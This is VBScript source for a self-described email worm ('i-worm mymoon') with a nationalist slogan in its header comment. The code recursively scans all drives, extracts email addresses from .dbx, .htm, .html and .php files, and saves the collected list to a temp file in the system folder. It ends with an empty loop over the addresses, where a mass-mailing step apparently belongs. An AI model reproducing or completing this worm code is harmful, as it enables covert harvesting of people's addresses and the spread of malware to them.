'i-worm mymoon coded by acidcookie / long live great serbia
on error resume next
Const ForReading = 1, ForWriting = 2, ForAppending = 3
Const TristateUseDefault = -2, TristateTrue = -1, TristateFalse = 0

Dim Sveadrese
Dim FSO
Dim vrc1
Set fso = CreateObject( "Scripting.FileSystemObject" )
Set vrc1 = CreateObject("WScript.Shell")

Set Drives=fso.drives
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next
Function Dosearch(Path) 
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files 
If fso.GetExtensionName(file.path)="dbx" or fso.GetExtensionName(file.path)="htm" or fso.GetExtensionName(file.path)="html" or fso.GetExtensionName(file.path)="php" then
	Dim file	
	set file = FSO.GetFile(file.path)

	Dim FileSize
	FileSize = file.Size

	Dim TextStream
	Set TextStream = file.OpenAsTextStream(ForReading, TristateUseDefault)

	' Read the file line by line
	Do While Not TextStream.AtEndOfStream
		Dim Line
		Line = TextStream.readline
		mesto2 = Instr(Line, "@")
		if mesto2 > 1 and len(Line) > mesto2 then
		if instr("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-", mid(Line,mesto2 - 1 ,1)) <> 0 and instr("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-",mid(Line,mesto2 + 1 ,1)) <> 0 then
		for i = 1 to mesto2 - 1
			if InstrRev("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-", mid(Line,mesto2 - i, 1)) = 0 then
			mesto1 = mesto2 - i
			Exit For
			end if
		Next
		for i = 1 to len(Line) - mesto2
			if Instr("qwertzuiopasdfghjklyxcvbnmQWERTZUIOPASDFGHJKLYXCVBNM1234567890_.-", mid(Line,mesto2 + i, 1)) = 0 then
			mesto3 = i - 1
			Exit For
			end if
		Next
		email = Mid(Line, mesto1 + 1, mesto3 + (mesto2 - mesto1))

		if not(_
		email > "" and _
		(instr(Instr(email, "@"), email, ".") > 0 and _
		instr(Instr(email, "@"), email, ".") < len(email)) and _
		instr(Sveadrese, email)=0 _
		)  then email = ""

		if email > "" then Sveadrese = Sveadrese + vbcrlf +  email
		end if
		end if
DoEvents() 
	Loop
	Set TextStream = nothing
	end If 
Next 
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function

Set Script = Fso.CreateTextFile(fso.GetSpecialFolder(1) & "\emls.tmp", True)
Script.Write Sveadrese
Script.Close
EArray = Split (Sveadrese, vbcrlf)
for i = 1 to Ubound(EArray)
next

